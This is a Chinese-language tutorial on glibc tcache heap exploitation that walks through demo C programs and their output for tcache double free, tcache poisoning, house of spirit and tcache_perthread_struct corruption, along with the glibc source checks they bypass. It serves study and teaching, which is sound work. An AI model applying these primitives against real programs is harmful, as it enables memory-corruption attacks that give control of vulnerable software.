# Tcache Attack

### 0x0 Tcache 基本计算

```c
//源码：
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>


struct malloc_chunk {

  size_t      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  size_t      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

/* The corresponding word size.  */
#define SIZE_SZ (sizeof (size_t))

#define MALLOC_ALIGNMENT (2 * SIZE_SZ < __alignof__ (long double) \
			  ? __alignof__ (long double) : 2 * SIZE_SZ)

/* The corresponding bit mask value.  */
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)

/* The smallest possible chunk */
#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))

/* The smallest size we can malloc is an aligned minimal chunk */
#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)

/* When "x" is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))

int main()
{
    unsigned long long req;
    unsigned long long tidx;
	fprintf(stderr, "This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.\n");
	fprintf(stderr, "The basic formula is as follows:\n");
    fprintf(stderr, "\tIDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT\n");
    fprintf(stderr, "\tOn a 64 bit system the current values are:\n");
    fprintf(stderr, "\t\tMINSIZE: 0x%lx\n", MINSIZE);
    fprintf(stderr, "\t\tMALLOC_ALIGNMENT: 0x%lx\n", MALLOC_ALIGNMENT);
    fprintf(stderr, "\tSo we get the following equation:\n");
    fprintf(stderr, "\tIDX = (CHUNKSIZE - 0x%lx) / 0x%lx\n\n", MINSIZE-MALLOC_ALIGNMENT+1, MALLOC_ALIGNMENT);
    fprintf(stderr, "BUT be AWARE that CHUNKSIZE is not the x in malloc(x)\n");
    fprintf(stderr, "It is calculated as follows:\n");
    fprintf(stderr, "\tIF x + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE(0x%lx) CHUNKSIZE = MINSIZE (0x%lx)\n", MINSIZE, MINSIZE);
    fprintf(stderr, "\tELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) \n");
    fprintf(stderr, "\t=> CHUNKSIZE = (x + 0x%lx + 0x%lx) & ~0x%lx\n\n\n", SIZE_SZ, MALLOC_ALIGN_MASK, MALLOC_ALIGN_MASK);
    while(1) {
        fprintf(stderr, "[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): ");
        scanf("%llx", &req);
        tidx = usize2tidx(req);
        if (tidx > 63) {
            fprintf(stderr, "\nWARNING: NOT IN TCACHE RANGE!\n");
        }
        fprintf(stderr, "\nTCache Idx: %llu\n", tidx);
    }
    return 0;
}
```



```shell
'This file calculates the tcache idx for a given chunk size.'
The basic formula is as follows:
	(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
	On a 64 bit system the current values are:
		MINSIZE: 0x20
		MALLOC_ALIGNMENT: 0x10
	So we get the following equation:
	(IDX = CHUNKSIZE - 0x11) / 0x10

BUT be AWARE that CHUNKSIZE is not the x in malloc(x)
It is calculated as follows:
	IF x < MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
	ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
	=> CHUNKSIZE = (x + 0x8 + 0xf) & ~0xf)


[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10

TCache Idx: 0
[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x20

TCache Idx: 1
[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x30

TCache Idx: 2
```



### 0x1 Tcache_dup.c

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");

	fprintf(stderr, "Allocating buffer.\n");
	int *a = malloc(8);

	fprintf(stderr, "malloc(8): %p\n", a);
	fprintf(stderr, "Freeing twice...\n");
	free(a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));

	return 0;
}
```

```shell
➜  glibc_2.26 git:(master) ✗ ./tcache_dup
This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x561098f19260
Freeing twice...
Now the free list has [ 0x561098f19260, 0x561098f19260 ].
Next allocated buffers will be same: [ 0x561098f19260, 0x561098f19260 ].
```



#### 原理分析

在`_int_free()`函数中，首先会进入Tcache操作：

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */

  size = chunksize (p);

  /* Little security check which won't hurt performance: the
     allocator never wrapps around at the end of the address space.
     Therefore we can exclude some size values which might appear
     here by accident or by "design" from some intruder.  */
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");
  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");

  check_inuse_chunk(av, p);

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);

    if (tcache
	&& tc_idx < mp_.tcache_bins
	&& tcache->counts[tc_idx] < mp_.tcache_count)
      {
	tcache_put (p, tc_idx);
	return;
      }
  }
#endif
```

```c
tcache_put()
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);	//只检查了idx即chunk size
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

所以，只要满足`size`，并且`bin`不满，就会被放进Tcache bin内。很简单地完成Double Free

### 0x2 tcache_poisoning

源码：

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
	       "returning a pointer to an arbitrary location (in this case, the stack).\n"
	       "The attack is very similar to fastbin corruption attack.\n\n");

	size_t stack_var;
	fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&stack_var);

	fprintf(stderr, "Allocating 1 buffer.\n");
	intptr_t *a = malloc(128);
	fprintf(stderr, "malloc(128): %p\n", a);
	fprintf(stderr, "Freeing the buffer...\n");
	free(a);

	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
	a[0] = (intptr_t)&stack_var;

	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *b = malloc(128);
	fprintf(stderr, "2nd malloc(128): %p\n", b);
	fprintf(stderr, "We got the control\n");

	return 0;
}
```

```shell
➜  glibc_2.26 git:(master) ✗ ./tcache_poisoning
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7fff2e7ba780.
Allocating 1 buffer.
malloc(128): 0x558ae1965260
Freeing the buffer...
Now the tcache list has [ 0x558ae1965260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x558ae1965260
to point to the location to control (0x7fff2e7ba780).
1st malloc(128): 0x558ae1965260
Now the tcache list has [ 0x7fff2e7ba780 ].
2nd malloc(128): 0x7fff2e7ba780
We got the control
```

#### 原理分析

**前提**是可以控制Tcache Bin的`next`指针（即`fd`指针)

这里只检查tcache bin是否idx合适，是否非空。

在`__libc_malloc()`中，Tcache 会被首先调用：

```c
void *
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache
      && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif
```

```c
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);			//只检查idx和是否非空。
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

### 0x3 tcache_house_of_spirit

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
	fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	fprintf(stderr, "Ok. Let's start with the example!.\n\n");


	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region

	fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

```shell
➜  glibc_2.26 git:(master) ✗ ./tcache_house_of_spirit
This file demonstrates the house of spirit attack on tcache.
It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.
You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.
(Search for strings "invalid next size" and "double free or corruption")

Ok. Let's start with the example!.

Calling malloc() once so that it sets up its memory.
Let's imagine we will overwrite 1 pointer to point to a fake chunk region.
This region contains one fake chunk. It's size field is placed at 0x7ffd8a6cc428
This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd8a6cc428.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffd8a6cc428, which will be 0x7ffd8a6cc430!
malloc(0x30): 0x7ffd8a6cc430
```

#### 原理分析

根据上面的`_int_free()`代码：只检查`size`字段。很方便就把`fake chunk`插入到`tcache bin`中。然后就可控了。

### 0x4 tcache perthread corruption

我们已经知道 `tcache_perthread_struct` 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。

这里没找到太好的例子，自己想了一种情况

设想有如下的堆排布情况

```
tcache_    +------------+
\perthread |......      |
\_struct   +------------+
           |counts[i]   |
           +------------+
           |......      |          +----------+
           +------------+          |header    |
           |entries[i]  |--------->+----------+
           +------------+          |NULL      |
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```

通过一些手段（如 `tcache posioning`），我们将其改为了

```
tcache_    +------------+<---------------------------+
\perthread |......      |                            |
\_struct   +------------+                            |
           |counts[i]   |                            |
           +------------+                            |
           |......      |          +----------+      |
           +------------+          |header    |      |
           |entries[i]  |--------->+----------+      |
           +------------+          |target    |------+
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```

这样，两次 malloc 后我们就返回了 `tcache_prethread_struct` 的地址，就可以控制整个 tcache 了。



**因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。**